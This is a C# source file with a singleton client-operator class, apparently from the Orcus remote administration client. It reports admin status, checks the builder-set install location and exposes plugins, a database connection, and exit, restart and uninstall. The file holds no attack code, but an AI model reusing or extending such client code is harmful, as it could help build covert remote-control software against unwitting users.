﻿using System;
using System.Windows.Forms;
using Orcus.CommandManagement;
using Orcus.Config;
using Orcus.Plugins;
using Orcus.Shared.Core;
using Orcus.Shared.Settings;
using Orcus.Utilities;

namespace Orcus.Core
{
    public class ClientOperator : IClientOperator
    {
        private static ClientOperator _instance;
        private static readonly object SyncRoot = new object();
        private IToolBase _toolBase;
        private IPathInformation _pathInformation;
        private DatabaseConnection _databaseConnection;

        private ClientOperator()
        {
        }

        public static ClientOperator Instance
        {
            get
            {
                if (_instance == null)
                {
                    lock (SyncRoot)
                    {
                        if (_instance == null)
                            _instance = new ClientOperator();
                    }
                }

                return _instance;
            }
        }

        public bool IsAdministrator => User.IsAdministrator;
        public string ClientPath => Consts.ApplicationPath;

        public IToolBase ToolBase => _toolBase ?? (_toolBase = new ToolBase());

        public DatabaseConnection DatabaseConnection
            => _databaseConnection ?? (_databaseConnection = new DatabaseConnection());

        public IPathInformation PathInformation => _pathInformation ?? (_pathInformation = new Consts());

        #if NET48
                public FrameworkVersion FrameworkVersion { get; } = FrameworkVersion.NET48;
        #endif
     
       public bool Is64BitProcess => Environment.Is64BitProcess;
        

        IDatabaseConnection IClientOperator.DatabaseConnection => DatabaseConnection;

        public bool IsInstalled => string.Equals(Consts.ApplicationPath,
            Environment.ExpandEnvironmentVariables(Settings.GetBuilderProperty<InstallationLocationBuilderProperty>().Path),
            StringComparison.OrdinalIgnoreCase);

        public T GetBuilderProperty<T>() where T : IBuilderProperty, new()
        {
            return Settings.GetBuilderProperty<T>();
        }

        public void Exit()
        {
            Program.Exit();
        }

        public void Restart()
        {
            Program.Unload();
            Application.Restart();
        }

        public void Uninstall()
        {
            UninstallHelper.UninstallAndClose();
        }
    }
}